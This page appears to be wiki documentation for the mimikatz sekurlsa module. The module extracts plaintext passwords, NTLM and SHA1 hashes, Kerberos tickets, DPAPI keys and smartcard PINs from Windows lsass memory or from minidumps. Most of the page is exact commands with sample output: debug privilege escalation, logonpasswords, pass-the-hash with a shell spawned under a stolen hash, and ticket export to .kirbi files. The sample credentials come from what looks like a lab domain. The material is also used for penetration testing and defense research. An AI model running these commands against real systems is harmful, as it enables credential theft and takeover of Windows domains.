This module extracts **passwords**, **keys**, **pin codes**, **tickets** from the memory of `lsass` (`Local Security Authority Subsystem Service`)  
_the process by default, or a minidump of it!_ (see: [howto ~ get passwords by memory dump](howto-~-get-passwords-by-memory-dump) for minidump or other dumps instructions)

When working with `lsass` process, `mimikatz` needs some rights, choice:
* Administrator, to get `debug` privilege via [`privilege::debug`](module-~-privilege#debug)
* `SYSTEM` account, via post exploitation tools, scheduled tasks, `psexec -s ...` - in this case `debug` privilege is not needed.

Without rights to access `lsass` process, all commands will fail with an error like this: `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` _(except when working with a minidump)_.

So, do not hesitate to start with:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # log sekurlsa.log
Using 'sekurlsa.log' for logfile : OK
```
...before others commands :wink:

The information that can be extracted depends on the version of Windows and authentication methods: [en] http://1drv.ms/1fCWkhu

> Commands: [logonpasswords](#logonpasswords), [pth](#pth), [tickets](#tickets), [ekeys](#ekeys), [dpapi](#dpapi), [minidump](#minidump), [process](#process), [searchpasswords](#searchpasswords), [msv](#msv), [wdigest](#wdigest), [kerberos](#kerberos), [tspkg](#tspkg), [livessp](#livessp), [ssp](#ssp), [credman](#credman)

## logonpasswords

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 88038 (00000000:000157e6)
Session           : Interactive from 1
User Name         : Gentil Kiwi
Domain            : vm-w7-ult
SID               : S-1-5-21-2044528444-627255920-3055224092-1000
        msv :
         [00000003] Primary
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult
         * Password : waza1234/
        wdigest :
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult
         * Password : waza1234/
        kerberos :
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult
         * Password : waza1234/
        ssp :
         [00000000]
         * Username : admin
         * Domain   : nas
         * Password : anotherpassword
        credman :
         [00000000]
         * Username : nas\admin
         * Domain   : nas.chocolate.local
         * Password : anotherpassword
```

## pth
> Pass-The-Hash

`mimikatz` can perform the well-known operation 'Pass-The-Hash' to run a process under another credentials with `NTLM` hash of the user's password, instead of its real password.

For this, it starts a process with a fake identity, then replaces fake information (`NTLM` hash of the fake password) with real information (`NTLM` hash of the real password).

**Arguments:**
* `/user` - the username you want to impersonate, keep in mind that Administrator is not the only name for this well-known account.
* `/domain` - the fully qualified domain name - without domain or in case of local user/admin, use computer or server name, `workgroup` or whatever.
* `/rc4` or `/ntlm` - _optional_ - the RC4 key / NTLM hash of the user's password.
* `/aes128` - _optional_ - the AES128 key derived from the user's password and the realm of the domain.
* `/aes256` - _optional_ - the AES256 key derived from the user's password and the realm of the domain.
* `/run` - _optional_ - the command line to run - default is: `cmd` to have a shell.

```
mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
user    : Administrateur
domain  : chocolate.local
program : cmd.exe
NTLM    : cc36cf7a8514893efccd332446158b1a
  |  PID  712
  |  TID  300
  |  LUID 0 ; 362544 (00000000:00058830)
  \_ msv1_0   - data copy @ 000F8AF4 : OK !
  \_ kerberos - data copy @ 000E23B8
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ des_cbc_md5       -> null
   \_ des_cbc_crc       -> null
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace -> null
```
Also valid on Windows recent versions:
* `sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9`
* `sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9`

**Remarks:**
* this command does not work with minidumps (nonsense);
* it requires elevated privileges (`privilege::debug` or `SYSTEM` account), unlike 'Pass-The-Ticket' which uses one official API ;
* this new version of 'Pass-The-Hash' replaces `RC4 keys` of Kerberos by the `ntlm` hash (and/or replaces `AES` keys) - it permits to the Kerberos provider to ask `TGT` tickets! ;
* `ntlm` hash is **mandatory** on XP/2003/Vista/2008 and before 7/2008r2/8/2012 `kb2871997` (`AES` not available or replaceable) ;
* `AES` keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with `kb2871997`, in this case you can avoid `ntlm` hash.

**See also:**
* Pass-The-Ticket: [kerberos::ptt](module-~-kerberos#ptt)
* Golden Ticket: [kerberos::golden](module-~-kerberos#golden)

## tickets
List and export Kerberos tickets of all sessions.  
Unlike [kerberos::list](module-~-kerberos#list), `sekurlsa` uses memory reading and is not subject to key export restrictions. `sekurlsa` can access tickets of others sessions (users).

**Argument:**
* `/export` - _optional_ - tickets are exported in `.kirbi` files. They start with user's `LUID` and group number (`0` = `TGS`, `1` = `client ticket`(?) and `2` = `TGT`)

```
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 541043 (00000000:00084173)
Session           : Interactive from 2
User Name         : Administrateur
Domain            : CHOCOLATE
SID               : S-1-5-21-130452501-2365100805-3685010670-500

	 * Username : Administrateur
	 * Domain   : CHOCOLATE.LOCAL
	 * Password : (null)

	Group 0 - Ticket Granting Service
	 [00000000]
	   Start/End/MaxRenew: 11/05/2014 16:47:59 ; 12/05/2014 02:47:58 ; 18/05/2014 16:47:58
	   Service Name (02) : ldap ; srvcharly.chocolate.local ; @ CHOCOLATE.LOCAL
	   Target Name  (02) : ldap ; srvcharly.chocolate.local ; @ CHOCOLATE.LOCAL
	   Client Name  (01) : Administrateur ; @ CHOCOLATE.LOCAL
	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     d0195b657e63cdec73f32bf44d36bb12a62c928de6db9964b5a87c55721f8d04
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5	[...]
	   * Saved to file [0;84173]-0-0-40a50000-Administrateur@ldap-srvcharly.chocolate.local.kirbi !
	 [00000001]
	   Start/End/MaxRenew: 11/05/2014 16:47:59 ; 12/05/2014 02:47:58 ; 18/05/2014 16:47:58
	   Service Name (02) : LDAP ; srvcharly.chocolate.local ; chocolate.local ; @ CHOCOLATE.LOCAL
	   Target Name  (02) : LDAP ; srvcharly.chocolate.local ; chocolate.local ; @ CHOCOLATE.LOCAL
	   Client Name  (01) : Administrateur ; @ CHOCOLATE.LOCAL ( CHOCOLATE.LOCAL )
	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     60cedabb5c3e2874131e9770c2d858fdec0342acf8c8787771d7c4475ace0392
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5	[...]
	   * Saved to file [0;84173]-0-1-40a50000-Administrateur@LDAP-srvcharly.chocolate.local.kirbi !

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket
	 [00000000]
	   Start/End/MaxRenew: 11/05/2014 16:47:58 ; 12/05/2014 02:47:58 ; 18/05/2014 16:47:58
	   Service Name (02) : krbtgt ; CHOCOLATE.LOCAL ; @ CHOCOLATE.LOCAL
	   Target Name  (02) : krbtgt ; CHOCOLATE.LOCAL ; @ CHOCOLATE.LOCAL
	   Client Name  (01) : Administrateur ; @ CHOCOLATE.LOCAL ( CHOCOLATE.LOCAL )
	   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     4b42cce01deffbfb0e67efc18c993bb52601848763aecf322030329cd1882e4c
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2	[...]
	   * Saved to file [0;84173]-2-0-40e10000-Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi !
```
**See also:**
* Pass-The-Ticket: [kerberos::ptt](module-~-kerberos#ptt)
* Golden Ticket: [kerberos::golden](module-~-kerberos#golden)

## ekeys
```
mimikatz # sekurlsa::ekeys

Authentication Id : 0 ; 541043 (00000000:00084173)
Session           : Interactive from 2
User Name         : Administrateur
Domain            : CHOCOLATE
SID               : S-1-5-21-130452501-2365100805-3685010670-500

         * Username : Administrateur
         * Domain   : CHOCOLATE.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
           rc4_hmac_nt       cc36cf7a8514893efccd332446158b1a
           rc4_hmac_old      cc36cf7a8514893efccd332446158b1a
           rc4_md4           cc36cf7a8514893efccd332446158b1a
           rc4_hmac_nt_exp   cc36cf7a8514893efccd332446158b1a
           rc4_hmac_old_exp  cc36cf7a8514893efccd332446158b1a
```

## dpapi

```
mimikatz # sekurlsa::dpapi

Authentication Id : 0 ; 251812 (00000000:0003d7a4)
Session           : Interactive from 1
User Name         : Administrateur
Domain            : CHOCOLATE
SID               : S-1-5-21-130452501-2365100805-3685010670-500
         [00000000]
         * GUID :       {62f69fd3-0a99-4531-bf94-7442fdf1e411}
         * Time :       01/05/2014 13:12:39
         * Key :        8801bde168af739ab81aa32b79aa0ee4c27cb9c0dc94b6ab0a8516e650b4bdd565110ae1040d3e47add422454d92b307276bebdba7b23b2b2f8005066ede3580
```
## minidump
```
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 88038 (00000000:000157e6)
Session           : Interactive from 1
User Name         : Gentil Kiwi
Domain            : vm-w7-ult
SID               : S-1-5-21-2044528444-627255920-3055224092-1000
        msv :
         [00000003] Primary
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
...
````

**Remark:**

Dump from   | Works on
----------- | ---------------------------------
NT 5 - x86  | NT 5 - x86
NT 5 - x64  | NT 5 - x64
NT 6 - x86  | NT 6 - x86/x64 _(`mimikatz x86`)_
NT 6 - x64  | NT 6 - x64

**Some errors:**
* `ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos->MajorVersion (A) != MIMIKATZ_NT_MAJOR_VERSION (B)`  
  You try to open minidump from a Windows NT of another major version (_NT5_ vs _NT6_).
* `ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos->ProcessorArchitecture (A) != PROCESSOR_ARCHITECTURE_xxx (B)`  
  You try to open minidump from a Windows NT of another architecture (_x86_ vs _x64_).
* `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)`  
  The minidump file is not found (check path).


## process
## searchpasswords
## msv

```
Authentication Id : 0 ; 3518063 (00000000:0035ae6f)
Session           : Unlock from 1
User Name         : Administrateur
Domain            : CHOCOLATE
SID               : S-1-5-21-130452501-2365100805-3685010670-500
        msv :
         [00010000] CredentialKeys
         * RootKey  : 2a099891174e2d700d44368255a53a1a0e360471343c1ad580d57989bba09a14
         * DPAPI    : 43d7b788389b67ee3bcac1786f01a75f

Authentication Id : 0 ; 3463053 (00000000:0034d78d)
Session           : Interactive from 2
User Name         : utilisateur
Domain            : CHOCOLATE
SID               : S-1-5-21-130452501-2365100805-3685010670-1107
        msv :
         [00010000] CredentialKeys
         * NTLM     : 8e3a18d453ec2450c321003772d678d5
         * SHA1     : 90bbad2741ee9c533eb8eb37f8fb4172b8896ffa
         [00000003] Primary
         * Username : utilisateur
         * Domain   : CHOCOLATE
         * LM       : 00000000000000000000000000000000
         * NTLM     : 8e3a18d453ec2450c321003772d678d5
         * SHA1     : 90bbad2741ee9c533eb8eb37f8fb4172b8896ffa
```

## wdigest
## kerberos

When using smartcard logon on the domain, `lsass` caches PIN code of the smartcard
```
mimikatz # sekurlsa::kerberos
[...]
        kerberos :
         * Username : Administrateur
         * Domain   : CHOCOLATE.LOCAL
         * Password : (null)
         * PIN code : 1234
````
## tspkg
## livessp
## ssp
## credman